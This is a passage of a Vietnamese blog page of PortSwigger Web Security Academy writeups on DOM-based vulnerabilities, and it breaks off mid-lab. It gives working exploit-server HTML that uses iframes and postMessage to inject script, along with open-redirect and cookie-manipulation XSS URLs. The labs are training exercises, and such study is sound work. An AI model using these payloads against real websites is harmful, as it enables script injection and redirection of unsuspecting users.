@@ -1,0 +1,1988 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/DOM-based%20vulnerabilities/">
+      
+      
+        <link rel="prev" href="../CSRF/">
+      
+      
+        <link rel="next" href="../XSS/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>DOM-based Vulnerabilities - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#dom-based-vulnerabilities" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              DOM-based Vulnerabilities
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20logic%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20condition/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20external%20entity%20%28XXE%29%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="dom-based-vulnerabilities">DOM-based vulnerabilities<a class="headerlink" href="#dom-based-vulnerabilities" title="Permanent link">&para;</a></h1>
+<h1 id="lab-dom-xss-using-web-messages"><strong>Lab: DOM XSS using web messages</strong><a class="headerlink" href="#lab-dom-xss-using-web-messages" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages">Lab: DOM XSS using web messages | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện dùng <code>ffuf</code> để fuzzing web. Nhận thấy có path <code>filter</code> chứa đoạn js dùng <code>innerHTML</code></p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image.png" /></p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Để có thể truyền giá trị vào param <code>message</code> cần phải dùng <code>postMessage</code> từ một trang nhúng hoặc popup chứa trang có sink trên.</p>
+</li>
+<li>
+<p>Trong exploit server, tạo trang như sau:</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;abc&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;&lt;url-lab&gt;/filter&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;width:1000px; height:1000px&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">abc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;abc&quot;</span><span class="p">);</span>
+<span class="nx">abc</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="p">()=&gt;{</span><span class="nx">abc</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&quot;&lt;img src=x onerror=print()&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;url-lab&gt;&quot;</span><span class="p">);}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>View exploit</code> . Quan sát thấy print thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>Deliver to victim</code> . Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%203.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-dom-xss-using-web-messages-and-a-javascript-url"><strong>Lab: DOM XSS using web messages and a JavaScript URL</strong><a class="headerlink" href="#lab-dom-xss-using-web-messages-and-a-javascript-url" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url">Lab: DOM XSS using web messages and a JavaScript URL | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện view source tại trang chủ. Nhận thấy có đoạn js sau chứa sink nguy hiểm</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%204.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Để có thể truyền giá trị vào param <code>message</code> cần phải dùng <code>postMessage</code> từ một trang nhúng hoặc popup chứa trang có sink trên.</p>
+</li>
+<li>Quan sát rằng đoạn js này sẽ gọi đến một url ⇒ có thể dùng <code>javascript</code> protocol để gọi mã js. Tuy nhiên, code đã có phần kiểm tra buộc url phải có <code>http</code> hoặc <code>https</code> ⇒ có thể thêm một đoạn comment để qua đoạn kiểm tra này. Điều hướng đến exploit server.</li>
+<li>
+<p>Trong exploit server, tạo trang như sau:</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;abc&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;&lt;url-lab&gt;&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;width:1000px; height:1000px&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">abc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;abc&quot;</span><span class="p">);</span>
+<span class="nx">abc</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="p">()=&gt;{</span><span class="nx">abc</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&quot;javascript:print()//http:&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;url-lab&gt;&quot;</span><span class="p">);}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>View exploit</code> và quan sát thấy rằng đã thực hiện print thành công trên trang có lỗ hổng</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>Deliver to victim</code> và quan sát thấy giải lab thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-dom-xss-using-web-messages-and-jsonparse"><strong>Lab: DOM XSS using web messages and <code>JSON.parse</code></strong><a class="headerlink" href="#lab-dom-xss-using-web-messages-and-jsonparse" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse">Lab: DOM XSS using web messages and JSON.parse | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Tại trang chủ, thực hiện view page source. Tại đây, quan sát thấy có một đoạn code js nhận message gửi đến và có một option đẩy url được <code>JSON.parse</code> từ message và đẩy vào mà không qua hàm kiểm tra nào</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%207.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Như vậy, chúng ta có thể truyền url tùy ý vào iframe bằng cách gửi một message với <code>type:load-chanel</code> và <code>url:&lt;url&gt;</code></p>
+</li>
+<li>
+<p>Điều hướng đến Exploit server và tạo một trang chứa trang web có vuln đồng thời viết thêm đoạn script gửi message như sau:</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code>&lt;iframe<span class="w"> </span><span class="nv">id</span><span class="o">=</span><span class="s2">&quot;abc&quot;</span><span class="w"> </span><span class="nv">src</span><span class="o">=</span><span class="s2">&quot;&lt;url-lab&gt;&quot;</span>&gt;&lt;/iframe&gt;
+&lt;script&gt;
+const<span class="w"> </span><span class="nv">abc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>document.getElementById<span class="o">(</span><span class="s2">&quot;abc&quot;</span><span class="o">)</span><span class="p">;</span>
+abc.onload<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">()=</span>&gt;<span class="o">{</span>
+abc.contentWindow.postMessage<span class="o">(</span><span class="s2">&quot;{\&quot;type\&quot;:\&quot;load-channel\&quot;,\&quot;url\&quot;:\&quot;javascript:print()\&quot;}&quot;</span>,<span class="s2">&quot;&lt;url-lab&gt;&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span><span class="p">;</span>
+&lt;/script&gt;
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện view exploit và quan sát thấy print thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%208.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>Deliver to victim</code> và hoàn thành solve lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%209.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-dom-based-open-redirection"><strong>Lab: DOM-based open redirection</strong><a class="headerlink" href="#lab-dom-based-open-redirection" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection">Lab: DOM-based open redirection | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện view một post bất kỳ. Quan sát source code nhận thấy tại nút <code>Back to Blog</code> nhận url mà user có thể kiểm soát mà không có kiểm tra ⇒ Open redirect</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện thêm query trên url như sau:</p>
+<ul>
+<li>
+<p>URL</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">url-lab</span><span class="p">&gt;</span>/post?postId=2<span class="err">&amp;</span>url=<span class="p">&lt;</span><span class="nt">url-exploit-server</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Điều hướng đến url trên. Quan sát thấy hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-dom-based-cookie-manipulation"><strong>Lab: DOM-based cookie manipulation</strong><a class="headerlink" href="#lab-dom-based-cookie-manipulation" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation">Lab: DOM-based cookie manipulation | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện xem một sản phẩm bất kỳ. Tại đây, trang hiển thị một sản phẩm thực hiện viewsource và thấy có đoạn js lấy <code>window.location</code> gắn vào cookie với name là <code>lastViewedProduct</code> . Sau đó, code thực hiện lấy giá trị này trong cookie và đẩy vào <code>href</code> attribute của thẻ <code>&lt;a&gt;</code></p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Như vậy, chúng ta có thể thực hiện escape ra khỏi thuộc tính và chèn code tùy ý như sau:</p>
+<ul>
+<li>
+<p>URL</p>
+<div class="highlight"><pre><span></span><code>&lt;url-lab&gt;/product?productId<span class="o">=</span><span class="m">3</span><span class="c1">#&#39;%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi URL cho victim bằng exploit server. Quan sát solve lab thành công</p>
+<ul>
+<li>
+<p>Exploit server config</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+</code></pre></div>
+</li>
+<li>
